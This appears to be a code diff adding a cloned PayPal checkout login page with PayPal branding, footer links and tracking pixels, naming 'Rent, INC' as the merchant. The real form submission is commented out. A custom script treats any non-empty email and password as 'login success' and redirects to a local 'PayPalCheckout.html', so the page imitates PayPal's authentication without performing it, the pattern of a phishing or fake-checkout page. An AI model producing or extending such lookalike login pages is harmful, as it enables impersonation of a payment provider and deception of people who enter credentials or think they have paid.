+    data-otp-login-on-pwd-page-enabled=true data-otp-login-eligible=true data-otp-login-integration-type=via_button
+    data-email-label="Email address" data-xhr-timeout-limit=20000 data-load-start-time=1667821147230
+    data-is-cookied-user=true data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10"><noscript>
+        <p class="nonjsAlert" role="alert">Note: Many features on the PayPal website require JavaScript and cookies.</p>
+    </noscript>
+    <div id=main class=main role=main>
+        <section id=login class=login data-role=page data-title="Log in to your PayPal account">
+            <div class=corral>
+                <div id=content class="contentContainer activeContent contentContainerBordered">
+                    <header id=header>
+                        <p role=img aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
+                    </header>
+                    <h1 id=headerText class=headerText>Pay with PayPal</h1>
+                    <p id=emailSubTagLine class="subHeaderText hide sf-hidden">Enter your email address to get started.
+                    <p id=phoneSubTagLine class="subHeaderText hide sf-hidden">Already set up to use your mobile number
+                        to log in? Type it below. Otherwise, click the link to log in with email.
+                    <p id=subTagLineConnectOtp class="subHeaderText hide sf-hidden">Forgot your email address? Go to the
+                        PayPal website to recover it.
+                    <p id=pwdSubTagLine class=subHeaderText>With a PayPal account, you're eligible for free return
+                        shipping, Purchase Protection, and more.
+                    <div class=notifications></div>
+                    <div id=keychainErrorMessage class="hide sf-hidden"></div>
+                    <form
+                        action="/signin?intent=checkout&amp;ctxId=xo_ctx_EC-7AD109434D786903J&amp;returnUri=%2Fwebapps%2Fhermes&amp;state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3DEC-7AD109434D786903J%26rcache%3D1%26cookieBannerVariant%3D1%26targetService4174%3Dhermesnodeweb&amp;locale.x=en_C2&amp;country.x=C2&amp;flowId=EC-7AD109434D786903J"
+                        method=post class="proceed maskable" autocomplete=off name=login novalidate>
+                        <div id=passwordSection class="clearfix splitEmail">
+                            <div id=splitEmailSection class="splitPhoneSection splitEmailSection">
+                                <div class="countryPhoneSelectWrapper hide sf-hidden"></div>
+                                <div class=textInput id=login_emaildiv>
+                                    <div class=fieldWrapper><input id=email name=login_email type=email
+                                            class="hasHelp validate validateEmpty" required value=""
+                                            autocomplete=username placeholder="Email or mobile number"
+                                            aria-describedby=emailErrorMessage><label for=email class=fieldLabel>Email
+                                            or mobile number</label></div>
+                                    <div class=errorMessage id=emailErrorMessage>
+                                        <p class="emptyError hide sf-hidden">Required
+                                        <p class="invalidError hide sf-hidden">That email or mobile number format isn’t
+                                            right</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id=passwordSection class="clearfix showHideButtonForEligibleBrowser">
+                                <div class=textInput id=login_passworddiv style=z-index:1>
+                                    <div class=fieldWrapper><input id=password name=login_password type=password
+                                            class="hasHelp validateEmpty pin-password" required value
+                                            placeholder=Password aria-describedby=passwordErrorMessage><label
+                                            for=password class=fieldLabel>Password</label><label for="Show password"
+                                            class=fieldLabel>Show password</label><button type=button
+                                            class="showPassword show-hide-password scTrack:unifiedlogin-show-password hide sf-hidden"
+                                            id="Show password" pa-marked=1>Show</button><label for=Hide
+                                            class=fieldLabel>Hide</label><button type=button
+                                            class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password sf-hidden"
+                                            id=Hide pa-marked=1>Hide</button></div>
+                                    <div class=errorMessage id=passwordErrorMessage>
+                                        <p class="emptyError hide sf-hidden">Required</p>
+                                    </div>
+                                </div><a href="#" class="recoveryOption1 forgotPassword"
+                                    data-client-log-action-type=clickForgotPasswordLink pa-marked=1>Forgot password?</a>
+                            </div>
+                        </div>
+
+                        <div class=actions>
+                            <!-- <button class="button actionContinue" type=submit id="btnLogin" name=btnLogin
+                                value=Login pa-marked=1>Log In</button> -->
+
+                        </div>
+                    </form>
+
+                    <button class="button actionContinue" id="loginBtn">Log In</button>
+
+
+                    <div id=beginOtpLogin class="otpLoginViaButton hidden sf-hidden"></div>
+                    <div id=tryAnotherWayLinkContainer class="tryAnotherWayLinkContainer hide sf-hidden"
+                        data-hide-on-pass></div>
+                    <div id=signupContainer class=signupContainer data-hide-on-email data-hide-on-pass>
+                        <div class=loginSignUpSeparator><span class=textInSeparator>or</span></div><button type=button
+                            href="/webapps/hermes?token=EC-7AD109434D786903J&amp;rcache=1&amp;cookieBannerVariant=1&amp;targetService4174=hermesnodeweb&amp;country.x=C2&amp;locale.x=en_US&amp;ulOnboardRedirect=true"
+                            class="button secondary scTrack:unifiedlogin-click-signup-button" id=createAccount
+                            pa-marked=1>Create an Account</button>
+                    </div>
+                    <div id=tpdButtonContainer class="signupContainer hide sf-hidden"></div>
+                    <div class=intentFooter>
+                        <div class=cancelUrl><a href="#" id="cancelLink" aria-hidden=false pa-marked=1>Cancel and return
+                                to Rent, INC</a>
+                        </div>
+                        <div class=localeSelector><span class="picker country-selector"><span class="hide sf-hidden"
+                                    id=countryPickerLink>China</span><button type=button
+                                    aria-labelledby=countryPickerLink class="country C2" pa-marked=1></button></span>
+                            <ul class=localeLink>
+                                <li><a class=scTrack:unifiedlogin-footer-language_zh_XC href="#" lang=zh
+                                        data-locale=zh_XC pa-marked=1>中文</a>
+                                <li><a class="selected scTrack:unifiedlogin-footer-language_en_US" href="#" lang=en
+                                        data-locale=en_US aria-current=”true” pa-marked=1>English</a>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id=tryAnotherWayModal class="tryAnotherWayModal hide sf-hidden"></div>
+        </section>
+
+        <section id=verification class="verification hide sf-hidden" data-role=page
+            data-title="Login Confirmation - PayPal"></section>
+        <footer class=footer role=contentinfo>
+            <div class=legalFooter>
+                <ul class=footerGroup>
+                    <li><a target=_blank href=https://www.paypal.com/c2/smarthelp/contact-us pa-marked=1>Contact Us</a>
+                    <li><a target=_blank href=https://www.paypal.com/c2/webapps/mpp/ua/privacy-full
+                            pa-marked=1>Privacy</a>
+                    <li><a target=_blank href=https://www.paypal.com/c2/webapps/mpp/ua/legalhub-full
+                            pa-marked=1>Legal</a>
+                    <li><a target=_blank href=https://www.paypal.com/c2/webapps/mpp/ua/upcoming-policies-full
+                            pa-marked=1>Policy Updates</a>
+                    <li><a target=_blank href=https://www.paypal.com/c2/webapps/mpp/country-worldwide
+                            pa-marked=1>Worldwide</a>
+                </ul>
+            </div>
+        </footer>
+    </div>
+
+    <div class="transitioning hide sf-hidden" aria-busy=false></div><noscript><img
+            src="https://c.paypal.com/v1/r/d/b/ns?f=BA-67K91842ND871804M&amp;s=UL_CHECKOUT_INPUT_PASSWORD&amp;js=0&amp;r=1"
+            title="ppfniframe" alt="" height="1" width="1" border="0"></noscript><noscript><img
+            src="https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&amp;page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&amp;pgst=1667821147230&amp;calc=f25341283b796&amp;nsid=GtQlk1mfBMu4Xku5J__-gow_jdwu9eEr&amp;rsta=en_US&amp;pgtf=Nodejs&amp;env=live&amp;s=ci&amp;ccpg=C2&amp;csci=58555083d44f4520aaf29503e15be1bf&amp;comp=unifiedloginnodeweb&amp;tsrce=devdiscoverynodeweb&amp;cu=1&amp;gacook=1478246208.1667818511&amp;transition_name=ss_prepare_pwd&amp;userRedirected=true&amp;fltk=EC-7AD109434D786903J&amp;flid=EC-7AD109434D786903J&amp;xe=101090%2C101736%2C101216%2C101270%2C104200%2C100644%2C102208&amp;xt=104050%2C105858%2C103864%2C106407%2C127485%2C101702%2C108106&amp;ctx_login_ot_content=0&amp;obex=checkout&amp;landing_page=login&amp;state_name=begin_pwd&amp;ctx_login_content_fetch=success&amp;ctx_login_ctxid_fetch=success%7Cparse-success&amp;ctx_login_lang_footer=shown&amp;ctx_login_cancel_url=shown&amp;forced_signup_offered=1&amp;ctx_login_signup_btn=shown%7CcreateAccount&amp;context_id=EC-7AD109434D786903J&amp;ctx_login_intent=checkout&amp;ctx_login_flow=Express%20checkout&amp;ctx_login_state_transition=login_loaded&amp;post_login_redirect=returnUri&amp;ret_url=%2Fwebapps%2Fhermes"
+            alt="" height="1" width="1" border="0"></noscript><iframe id=grcv3enterpriseframe
+        sandbox="allow-same-origin allow-scripts allow-popups"
+        style="position:fixed;bottom:30px;right:1.5px;width:74px;transition:width 0.3s ease 0s;height:66px;border:0px;z-index:2147483000;display:none"></iframe><iframe
+        id=ppfnfnclspbfiframe title=pbf
+        style=width:0px;height:0px;border:0px;position:absolute;z-index:-999;top:-10000px;left:-10000px aria-hidden=true
+        sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation"
+        srcdoc="<html><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;&quot;><style>img[src=&quot;data:,&quot;],source[src=&quot;data:,&quot;]{display:none!important}</style>"></iframe><iframe
+        allow=geolocation id=ppfnfnclsiframe title=ppfniframe aria-hidden=true
+        style=width:0px;height:0px;border:0px;position:absolute;z-index:-999;top:-10000px;left:-10000px
+        sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation" srcdoc="<!DOCTYPE html> <html><meta charset=utf-8>
+<title>PayPal</title>
+<meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;&quot;><style>img[src=&quot;data:,&quot;],source[src=&quot;data:,&quot;]{display:none!important}</style></head>
+<body>
+"></iframe>
+
+    <script>
+        let eamilInput = document.getElementById("email");
+        let passwordInput = document.getElementById("password");
+
+        let cancelLink = document.querySelector('#cancelLink');
+        cancelLink.addEventListener('click', function (e) {
+            console.log('cancelLink clicked');
+        });
+
+        let btnLogin = document.querySelector('#loginBtn');
+        btnLogin.onclick = function () {
+            // console.log('btnLogin clicked')
+            if (eamilInput.value == '' || passwordInput.value == '') {
+                alert('Please enter your email and password');
+                return false;
+            } else {
+                console.log("login success");
+                window.location.href = 'PayPalCheckout.html';
+            }
+        }
+    </script>
